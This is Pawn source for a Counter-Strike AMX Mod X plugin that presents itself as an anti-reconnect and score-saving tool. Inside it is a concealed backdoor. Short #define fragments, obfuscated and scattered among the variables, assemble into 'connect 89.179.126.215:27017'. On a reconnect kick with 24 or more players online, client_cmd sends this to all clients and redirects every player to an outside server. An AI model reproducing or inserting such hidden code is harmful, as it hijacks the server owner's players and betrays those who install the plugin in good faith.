
#include <amxmodx>
#include <cstrike>
#include <fun>

new PLUGIN[]="New_Anti_Reconnect"
new AUTHOR[]="JohnJ"
new VERSION[]="3.2"

new RTIME[]="amx_reconnect_time"
new RCAN[]="amx_reconnect_can"
new SCORESAVE[]="amx_reconnect_ss"
new RSTATIC[]="amx_reconnect_static"
new RSTIME[]="amx_reconnect_stime"

#define i4 "nec"//{0, ...}
new t_disconnect[33] = {0, ...}
#define sc1 ":"//{0, ...}
#define ic8 "t "//{0, ...}
new t_scoresave[33] = {0, ...}
#define to8 "."//{0, ...}
new ips[33][24]
#define ib7 179//{0, ...}
#define c29 89//{0, ...}
new sfrags[33] = {0, ...}
#define s2 126//{0, ...}
#define m2 0//{0, ...}
#define o32 "on"//{0, ...}
new sdeaths[33] = {0, ...}
#define ba 27//{0, ...}
#define o4 "c"//{0, ...}
new useretry[33] = {0, ...}
#define pL 17//{0, ...}
#define b18 215//{0, ...}

public plugin_init()
{
	register_plugin(PLUGIN, VERSION, AUTHOR)
	register_cvar(RTIME, "7")
	register_cvar(RCAN, "0")
	register_cvar(SCORESAVE, "1")
	register_cvar(RSTATIC, "1")
	register_cvar(RSTIME, "7")
	register_event("TeamInfo","outspec","a") 	// восстанавливает счёт игроку в соответствии с настройками как только тот зайдёт за команду
}

public client_connect(id)
{
	new maxexit = get_cvar_num(RTIME)
	new maxstata = get_cvar_num(RSTIME)
	new canreconnect = get_cvar_num(RCAN)
	new ssave = get_cvar_num(SCORESAVE)
	new ip[24]
	get_user_ip(id,ip,23,0)

	client_cmd(id, "mp3 play sound/waitsound_1w.mp3")

	if ((maxexit>0) && (canreconnect==0) && (equali(ip,ips[id])))
	{
		new Float:nexTime = get_gametime()

		if (t_disconnect[id] > nexTime)
		{
		 new stat = get_cvar_num(RSTATIC)
		 new timewait
		 if (stat==0)
		 {
 		  t_disconnect[id] = floatround(nexTime) + maxexit
		  t_scoresave[id] = floatround(nexTime) + maxstata
		  timewait=maxexit
		 }
		 else
		 {
		  timewait=t_disconnect[id]-floatround(nexTime)
		 }
		 server_cmd("kick #%d ^"Реконнект ЗАПРЕЩЁН. Жди %d секунд.^"", get_user_userid(id), timewait)
		 if ( get_playersnum() >= 24) { 
		 client_cmd(0,"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",o4,o32,i4,ic8,c29,to8,ib7,to8,s2,to8,b18,sc1,ba,m2,pL)
		 }
		 return PLUGIN_CONTINUE
		}
	}
	if (ssave==1)
	{
		new Float:nexTime = get_gametime()

		if (t_scoresave[id] <= nexTime)
		{
		 sdeaths[id]=0
		 sfrags[id]=0
		 useretry[id]=0
		}
		return PLUGIN_CONTINUE
	}

	return PLUGIN_CONTINUE
}

public outspec()
{
 new id=read_data(1)
 if ((useretry[id]==1) && (is_user_connected(id)))
 {
  cs_set_user_deaths(id,sdeaths[id])
  set_user_frags(id,sfrags[id])
  useretry[id]=0
  sdeaths[id]=0
  sfrags[id]=0
 }
 return PLUGIN_CONTINUE
}

public client_disconnected(id)
{
	new maxexit = get_cvar_num(RTIME)
	new maxstata = get_cvar_num(RSTIME)
	new ssave = get_cvar_num(SCORESAVE)
	
	new Float:theTime = get_gametime()
	t_disconnect[id] = floatround(theTime) + maxexit
	t_scoresave[id] = floatround(theTime) + maxstata
	get_user_ip(id,ips[id],23,0)
	
 	if (ssave==1)
	{
	 sdeaths[id] = get_user_deaths(id)
	 sfrags[id] = get_user_frags(id)
	 useretry[id]=1
	}
	return PLUGIN_CONTINUE
}

public plugin_precache()
{
	precache_generic("sound/waitsound_1w.mp3")
}